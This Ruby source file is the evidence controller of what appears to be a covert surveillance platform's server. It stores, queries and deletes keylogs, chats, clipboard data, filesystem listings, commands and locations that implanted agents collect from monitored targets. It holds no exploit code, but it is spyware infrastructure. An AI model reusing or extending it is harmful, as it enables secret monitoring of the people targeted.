#
# Controller for the Evidence objects
#

require_relative '../db_layer'
require_relative '../position/resolver'
require_relative '../connector_manager'
require_relative '../evidence_dispatcher'

# rcs-common
require 'rcs-common/symbolize'
require 'eventmachine'
require 'em-http-request'


# system
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  SYNC_IDLE = 0
  SYNC_IN_PROGRESS = 1
  SYNC_TIMEOUTED = 2
  SYNC_PROCESSING = 3
  SYNC_GHOST = 4

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  #
  # NOTE: this is used only by the evidence imported. It does not send the evidence
  # to the right shard but always to the LOCAL rcs-worker service
  def create
    require_auth_level :server, :tech_import

    content = @request[:content]['content']

    return conflict unless content

    ident = @params['_id'].slice(0..13)
    instance = @params['_id'].slice(15..-1)

    return conflict if ident.blank? or instance.blank?

    instance.downcase!

    begin
      send_evidence_to_local_worker(ident, instance, content)
    rescue Exception => e
      trace :warn, "Cannot send evidence to local worker: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
      return not_found
    end

    ok(bytes: content.bytesize)
  end

  def send_evidence_to_local_worker(ident, instance, content)
    trace :debug, "Sending evidence of agent #{ident}:#{instance} (#{content.bytesize} bytes) to the local worker"

    host = 'localhost'
    port = (Config.instance.global['LISTENING_PORT'] || 443) - 1

    connection = Net::HTTP.new(host, port)
    connection.use_ssl = true
    connection.verify_mode = OpenSSL::SSL::VERIFY_NONE
    connection.open_timeout = 5

    request = Net::HTTP::Post.new("/evidence/#{ident}:#{instance}")
    request.add_field 'Connection', 'keep-alive'
    request.add_field 'Keep-Alive', '60'
    request.body = content

    resp = connection.request(request)
    resp_code = resp.code.to_i

    if resp_code == 200
      processed_bytes = JSON.parse(resp.body)['bytes'].to_i
      raise "Invalid bytesize" if processed_bytes != content.bytesize
    else
      raise "#{resp_code} error"
    end
  end

  # used by the carrier to send evidence to the correct worker for an instance
  def worker
    require_auth_level :server

    ident, instance = @params['_id'].split(':')
    shard_id = EvidenceDispatcher.instance.shard_id(ident, instance)
    address = EvidenceDispatcher.instance.address(shard_id)[:host]

    trace :info, "Assigned Worker for #{ident} #{instance} is #{shard_id} (#{address})"

    return ok("#{address}:#{Config.instance.global['LISTENING_PORT']-1}", {content_type: 'text/html'})
  end

  def update
    require_auth_level :view
    require_auth_level :view_edit

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.target(target[:_id]).find(@params['_id'])
      @params.delete('_id')
      @params.delete('target')

      # data cannot be modified !!!
      @params.delete('data')

      # keyword index for note
      if @params.has_key? 'note'
        evidence[:kw] += @params['note'].keywords
        evidence.save
      end

      @params.each_pair do |key, value|
        if evidence[key.to_s] != value
          Audit.log :actor => @session.user[:name], :action => 'evidence.update', :desc => "Updated '#{key}' to '#{value}' for evidence #{evidence[:_id]}", :_item => target
        end
      end

      evidence.update_attributes(@params)

      return ok(evidence)
    end
  end

  def show
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.target(target[:_id]).where({_id: @params['_id']}).without(:kw).first

      # get a fresh decoding of the position
      if evidence[:type] == 'position'
        result = PositionResolver.decode_evidence(evidence[:data])
        evidence[:data] = evidence[:data].merge(result)
        evidence.save
      end

      return ok(evidence)
    end
  end

  def destroy
    require_auth_level :view_delete

    return conflict("Unable to delete") unless LicenseManager.instance.check :deletion

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.target(target[:_id]).find(@params['_id'])
      agent = Item.find(evidence[:aid])
      agent.stat.evidence[evidence.type] -= 1 if agent.stat.evidence[evidence.type]
      agent.stat.size -= evidence.data.to_s.length
      agent.stat.grid_size -= evidence.data[:_grid_size] unless evidence.data[:_grid].nil?
      agent.save

      Audit.log :actor => @session.user[:name], :action => 'evidence.destroy', :desc => "Deleted evidence #{evidence.type} #{evidence[:_id]}", :_item => agent

      evidence.destroy

      return ok
    end
  end

  def destroy_all
    require_auth_level :view_delete

    return conflict("Unable to delete") unless LicenseManager.instance.check :deletion

    item_id = @params['agent'] || @params['target']

    item = Item.find(item_id) or
      return not_found()

    Audit.log :actor  => @session.user[:name],
              :action => 'evidence.destroy',
              :desc   => "Deleted multi evidence from: #{Time.at(@params['from'])} to: #{Time.at(@params['to'])} relevance: #{@params['rel']} type: #{@params['type']}",
              :_item  => item

    trace :debug, "destroy_all Deleting evidence: #{@params}"

    task = {name: "delete multi evidence",
            method: "::Evidence.offload_delete_evidence",
            params: @params}

    OffloadManager.instance.run task

    return ok
  end

  def translate
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.target(target[:_id]).where({_id: @params['_id']}).without(:kw).first

      # add to the translation queue
      if LicenseManager.instance.check(:translation) and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
        TransQueue.add(target._id, evidence._id)
        evidence.data[:tr] = "TRANS_QUEUED"
        evidence.save
      end

      return ok(evidence)
    end
  end

  def body
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.target(target[:_id]).find(@params['_id'])

      return ok(evidence.data['body'], {content_type: 'text/html'})
    end
  end

  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server, :tech_import

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    ConnectorManager.process_sync_event(agent, :sync_start, @params)

    sync_start(agent, @params)

    return ok
  end

  def sync_start(agent, params)
    time = Time.at(params['sync_time']).getutc

    # convert the string time to a time object to be passed to 'sync_start'
    trace :info, "#{agent[:name]} sync started [#{agent[:ident]}:#{agent[:instance]}]"

    # update the agent version
    agent.version = params['version']

    # reset the counter for the dashboard
    agent.reset_dashboard

    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:last_sync_status] = SYNC_IN_PROGRESS
    agent.stat[:source] = params['source']
    agent.stat[:user] = params['user']
    agent.stat[:device] = params['device']
    agent.save

    # update the stat of the target
    target = agent.get_parent
    target.stat[:last_sync] = time
    target.stat[:last_child] = [agent[:_id]]
    target.reset_dashboard
    target.save

    # update the stat of the operation
    operation = target.get_parent
    operation.stat[:last_sync] = time
    operation.stat[:last_child] = [target[:_id]]
    operation.save

    # check for alerts on this agent
    Alerting.new_sync agent

    insert_sync_address(target, agent, params['source'])

    Item.send_dashboard_push(agent, target, operation)
  end

  def insert_sync_address(target, agent, address)

    # resolv the position of the address
    position = PositionResolver.get({'ipAddress' => {'ipv4' => address}})

    # add the evidence to the target
    ev = ::Evidence.dynamic_new(target[:_id])
    ev.type = 'ip'
    ev.da = Time.now.getutc.to_i
    ev.dr = Time.now.getutc.to_i
    ev.aid = agent[:_id].to_s
    ev[:data] = {content: address}
    ev[:data] = ev[:data].merge(position)
    ev.save
  end

  # used by the collector to update the synctime during evidence transfer
  def start_update
    require_auth_level :server, :tech_import

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    trace :info, "#{agent[:name]} sync update [#{agent[:ident]}:#{agent[:instance]}]"

    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc

    # update the agent version
    agent.version = @params['version']

    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save

    # update the stat of the target
    target = agent.get_parent
    target.stat[:last_sync] = time
    target.stat[:last_child] = [agent[:_id]]
    target.save

    # update the stat of the operation
    operation = target.get_parent
    operation.stat[:last_sync] = time
    operation.stat[:last_child] = [target[:_id]]
    operation.save

    Item.send_dashboard_push(agent, target, operation)

    return ok
  end

  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server, :tech_import

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    ConnectorManager.process_sync_event(agent, :sync_stop)

    sync_stop(agent)

    return ok
  end

  def sync_stop(agent, params = {})
    trace :info, "#{agent[:name]} sync end [#{agent[:ident]}:#{agent[:instance]}]"

    agent.stat[:last_sync] = Time.now.getutc.to_i
    agent.stat[:last_sync_status] = SYNC_IDLE
    agent.save

    target = agent.get_parent
    operation = target.get_parent

    Item.send_dashboard_push(agent, target, operation)
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    ConnectorManager.process_sync_event(agent, :sync_timeout)

    sync_timeout(agent)

    return ok
  end

  def sync_timeout(agent, params = {})
    trace :info, "#{agent[:name]} sync timeouted [#{agent[:ident]}:#{agent[:instance]}]"

    agent.stat[:last_sync] = Time.now.getutc.to_i
    agent.stat[:last_sync_status] = SYNC_TIMEOUTED
    agent.save
  end

  def index
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return ok([]) if filter.nil?

      geo_near_coordinates = filter_hash.delete('geoNear_coordinates')
      geo_near_accuracy = filter_hash.delete('geoNear_accuracy')

      # copy remaining filtering criteria (if any)
      filtering = Evidence.target(target[:_id]).stats_relevant
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # paging
      if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
        start_index = @params['startIndex'].to_i
        num_items = @params['numItems'].to_i
        query = filtering.where(filter_hash).without(:body, :kw, 'data.body').order_by([[:da, :asc]]).skip(start_index).limit(num_items)
      else
        # without paging, return everything
        query = filtering.where(filter_hash).without(:body, :kw, 'data.body').order_by([[:da, :asc]])
      end

      if geo_near_coordinates
        query = query.positions_within(geo_near_coordinates, geo_near_accuracy)
      end

      # fix to provide correct stats
      return ok(query, {gzip: true})
    end
  end

  def count
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return ok(-1) if filter.nil?

      geo_near_coordinates = filter_hash.delete('geoNear_coordinates')
      geo_near_accuracy = filter_hash.delete('geoNear_accuracy')

      # copy remaining filtering criteria (if any)
      filtering = Evidence.target(target[:_id]).stats_relevant
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      filtering = filtering.where(filter_hash)

      if geo_near_coordinates
        filtering = filtering.positions_within(geo_near_coordinates, geo_near_accuracy)
      end

      num_evidence = filtering.count

      # Flex RPC does not accept 0 (zero) as return value for a pagination (-1 is a safe alternative)
      num_evidence = -1 if num_evidence == 0
      return ok(num_evidence)
    end
  end

  def info
    require_auth_level :view, :tech

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return ok([]) if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.target(target[:_id]).where({:type => 'info'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:da, :asc]])

      return ok(query)
    end
  end

  def total
    require_auth_level :view

    mongoid_query do

      # filtering
      filter = {}
      filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'

      # filter by target
      target = Item.where({_id: filter['target']}).first
      return not_found("Target not found") if target.nil?

      condition = {}

      # filter by agent
      if filter['agent']
        agent = Item.where({_id: filter['agent']}).first
        return not_found("Agent not found") if agent.nil?
        condition[:aid] = filter['agent']
      end

      stats = []
      Evidence.target(target).count_by_type(condition).each do |type, count|
        stats << {type: type, count: count}
      end

      total = stats.collect {|b| b[:count]}.inject(:+)
      stats << {type: "total", count: total}

      return ok(stats)
    end
  end

  def filesystem
    require_auth_level :view
    require_auth_level :view_filesystem

    mongoid_query do

      # filter by target
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found") if target.nil?

      agent = nil

      # filter by agent
      if @params.has_key? 'agent'
        agent = Item.where({_id: @params['agent']}).first
        return not_found("Agent not found") if agent.nil?
      end

      # copy remaining filtering criteria (if any)
      filtering = Evidence.target(target[:_id]).where({:type => 'filesystem'})
      filtering = filtering.any_in(:aid => [agent[:_id]]) unless agent.nil?

      if @params['filter']

        #filter = @params['filter']

        # complete the request with some regex magic...
        filter = "^" + Regexp.escape(@params['filter']) + "[^\\\\\\\/]+$"

        # special case if they request the root
        filter = "^[[:alpha:]]:$" if @params['filter'] == "[root]" and ['windows', 'winmo', 'symbian', 'winphone'].include? agent.platform
        filter = "^\/$" if @params['filter'] == "[root]" and ['blackberry', 'android', 'osx', 'ios', 'linux'].include? agent.platform

        filtering = filtering.and({"data.path".to_sym => Regexp.new(filter, Regexp::IGNORECASE)})
      end

      # perform de-duplication and sorting at app-layer and not in mongo
      # because the data set can be larger than mongo is able to handle
      data = filtering.to_a
      data.uniq! {|x| x[:data]['path']}
      data.sort! {|x, y| x[:data]['path'].downcase <=> y[:data]['path'].downcase}

      trace :debug, "Filesystem request #{filter} resulted in #{data.size} entries"

      return ok(data)
    end
  end

  def commands
    require_auth_level :view, :tech_exec

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return ok([]) if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.target(target[:_id]).where({:type => 'command'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:da, :asc]])

      return ok(query)
    end
  end


  def ips
    require_auth_level :view, :tech

    mongoid_query do

      filter, filter_hash, target = ::Evidence.common_filter @params
      return ok([]) if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.target(target[:_id]).where({:type => 'ip'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:da, :asc]])

      return ok(query)
    end
  end

  private :insert_sync_address, :sync_start, :sync_stop, :sync_timeout
end

end #DB::
end #RCS::